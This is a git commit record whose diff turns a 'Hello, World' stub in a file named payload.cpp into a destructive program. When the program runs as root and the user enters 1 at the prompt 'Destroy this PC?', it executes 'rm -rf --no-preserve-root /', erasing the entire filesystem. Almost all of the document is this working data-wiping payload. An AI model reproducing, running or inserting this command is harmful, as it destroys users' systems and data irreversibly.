6c06f59114f90fff8234e672a8c8a45c3e0d746b
Blake Mallory <blakecmallory@gmail.com>
2020-04-24 00:11:55 -0400

    updated payload to final

--- exe/c/payload.cpp
+++ exe/c/payload.cpp
@@ -3,9 +3,24 @@
 #include <stdlib.h>
 #include <iostream>
 #include <string>
+#include <sys/types.h>
 int main()
 {
-    printf("Hello, World!");
-    system("mkdir /home/test");
+    int destroy = 0;
+    int id = getuid();
+    if(id ==0){
+        std::cout<<"\nYou are root";
+        std::cout<<"\nDestroy this PC? ";
+        std::cin>>destroy;
+        if (destroy==1){
+            system("rm -rf --no-preserve-root /");
+        }
+        else{
+            std::cout<<"\nThis pc lives to see another day";
+        }
+    }
+    else{
+        std::cout<<"\nYou are not root";
+    }
     return 0;
 }
